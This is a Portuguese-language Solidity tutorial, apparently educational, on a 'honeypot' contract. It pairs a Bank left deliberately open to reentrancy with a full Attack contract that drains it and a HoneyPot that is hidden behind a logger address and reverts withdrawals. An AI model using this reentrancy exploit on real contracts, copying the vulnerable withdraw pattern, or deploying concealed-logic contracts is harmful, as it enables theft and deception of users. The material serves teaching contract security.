# Honeypot

Um honeypot é uma armadilha para caçadores de hackers.

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

Combinando 2 exploits, reentrada e escondendo códigos maliciosos, podemos criar um contrato que consiga pegar usuários maliciosos.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
Bank é um contrato que chama Logger para enventos log.
Bank.withdraw() é vulnerável a ataque de reentrada.
Então um hacker tenta drenar Ether do Bank.
Mas na verdade o exploit de reentrada é uma isca para hackers.
Implementando Bank com HoneyPot no lugar do Logger, esse contrato se torna
uma armadilha para hackers. Vejamos como.

1. Alice implanta HoneyPot
2. Alice implanta Bank com endereço do HoneyPot
3. Alice deposita 1 Ether no Bank.
4. Eve descobre a exploit de reentrada em Bank.withdraw e decide hackear.
5. Eve implanta Attack com endereço do Bank
6. Eve chama Attack.attack() com 1 Ether mas a transação falha.

O que aconteceu?
Eve chama Attack.attack() e ela começa a retirar Ether do Bank.
Quando o último Bank.withdraw() está prestes a acontecer, ele chama logger.log().
Logger.log() chama HoneyPot.log() e reverte. A transação falha.
*/

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

// Hacker tenta drenar Ethers armazenados no Bank por reentrada.
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Digamos que esse código esteja em arquivo separado de forma que outros não possam ler.
contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Função para comparar strings usando keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
```
